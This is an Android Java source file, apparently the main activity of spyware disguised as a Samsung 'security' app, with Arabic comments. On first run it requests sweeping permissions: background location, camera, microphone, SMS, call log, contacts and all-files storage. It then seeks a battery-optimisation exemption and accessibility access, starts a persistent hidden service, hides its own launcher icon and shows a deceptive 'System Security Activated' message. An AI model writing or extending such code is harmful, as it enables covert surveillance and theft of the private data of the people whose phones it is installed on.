package com.samsung.android.security.v8;

import android.Manifest;
import android.app.Activity;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.PowerManager;
import android.provider.Settings;
import android.widget.Toast;

import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import com.samsung.android.security.v8.services.CoreService;
import com.samsung.android.security.v8.utils.AppHider;
import com.samsung.android.security.v8.utils.PermissionManager;

import java.util.ArrayList;
import java.util.List;

public class MainActivity extends Activity {
    
    private static final int PERMISSION_REQUEST_CODE = 1001;
    private static final int BATTERY_REQUEST_CODE = 1002;
    private static final int STORAGE_REQUEST_CODE = 1003;
    
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        if (isFirstRun()) {
            setupFirstRun();
        } else {
            startCoreService();
            finish();
        }
    }
    
    private void setupFirstRun() {
        requestAllPermissions();
    }
    
    private void requestAllPermissions() {
        List<String> permissionsToRequest = new ArrayList<>();
        
        // الصلاحيات الأساسية
        String[] permissions = {
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.ACCESS_COARSE_LOCATION,
            Manifest.permission.CAMERA,
            Manifest.permission.RECORD_AUDIO,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.READ_SMS,
            Manifest.permission.READ_PHONE_STATE
        };
        
        for (String permission : permissions) {
            if (ContextCompat.checkSelfPermission(this, permission) 
                    != PackageManager.PERMISSION_GRANTED) {
                permissionsToRequest.add(permission);
            }
        }
        
        // صلاحيات التخزين حسب النسخة
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            permissionsToRequest.add(Manifest.permission.READ_MEDIA_IMAGES);
            permissionsToRequest.add(Manifest.permission.READ_MEDIA_VIDEO);
            permissionsToRequest.add(Manifest.permission.READ_MEDIA_AUDIO);
            permissionsToRequest.add(Manifest.permission.POST_NOTIFICATIONS);
        } else {
            permissionsToRequest.add(Manifest.permission.READ_EXTERNAL_STORAGE);
            permissionsToRequest.add(Manifest.permission.WRITE_EXTERNAL_STORAGE);
        }
        
        // صلاحية الموقع في الخلفية
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            permissionsToRequest.add(Manifest.permission.ACCESS_BACKGROUND_LOCATION);
        }
        
        if (!permissionsToRequest.isEmpty()) {
            ActivityCompat.requestPermissions(this, 
                permissionsToRequest.toArray(new String[0]), 
                PERMISSION_REQUEST_CODE);
        } else {
            requestBatteryOptimization();
        }
    }
    
    private void requestBatteryOptimization() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            Intent intent = new Intent();
            String packageName = getPackageName();
            PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
            
            if (!pm.isIgnoringBatteryOptimizations(packageName)) {
                intent.setAction(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
                intent.setData(Uri.parse("package:" + packageName));
                startActivityForResult(intent, BATTERY_REQUEST_CODE);
            } else {
                requestStoragePermission();
            }
        } else {
            requestStoragePermission();
        }
    }
    
    private void requestStoragePermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            if (!android.os.Environment.isExternalStorageManager()) {
                try {
                    Intent intent = new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION);
                    intent.setData(Uri.parse("package:" + getPackageName()));
                    startActivityForResult(intent, STORAGE_REQUEST_CODE);
                } catch (Exception e) {
                    Intent intent = new Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION);
                    startActivityForResult(intent, STORAGE_REQUEST_CODE);
                }
            } else {
                requestAccessibility();
            }
        } else {
            requestAccessibility();
        }
    }
    
    private void requestAccessibility() {
        try {
            Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
            startActivity(intent);
        } catch (Exception e) {
            e.printStackTrace();
        }
        
        finalizeSetup();
    }
    
    private void finalizeSetup() {
        // تشغيل الخدمة
        startCoreService();
        
        // إخفاء الأيقونة
        AppHider.hideApp(this);
        
        // حفظ أن التطبيق تم تشغيله
        saveFirstRunComplete();
        
        Toast.makeText(this, "System Security Activated", Toast.LENGTH_SHORT).show();
        finish();
    }
    
    private void startCoreService() {
        Intent serviceIntent = new Intent(this, CoreService.class);
        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(serviceIntent);
        } else {
            startService(serviceIntent);
        }
    }
    
    private boolean isFirstRun() {
        SharedPreferences prefs = getSharedPreferences("app_prefs", MODE_PRIVATE);
        return prefs.getBoolean("first_run", true);
    }
    
    private void saveFirstRunComplete() {
        SharedPreferences prefs = getSharedPreferences("app_prefs", MODE_PRIVATE);
        prefs.edit().putBoolean("first_run", false).apply();
    }
    
    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        
        if (requestCode == PERMISSION_REQUEST_CODE) {
            requestBatteryOptimization();
        }
    }
    
    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        
        if (requestCode == BATTERY_REQUEST_CODE) {
            requestStoragePermission();
        } else if (requestCode == STORAGE_REQUEST_CODE) {
            requestAccessibility();
        }
    }
}
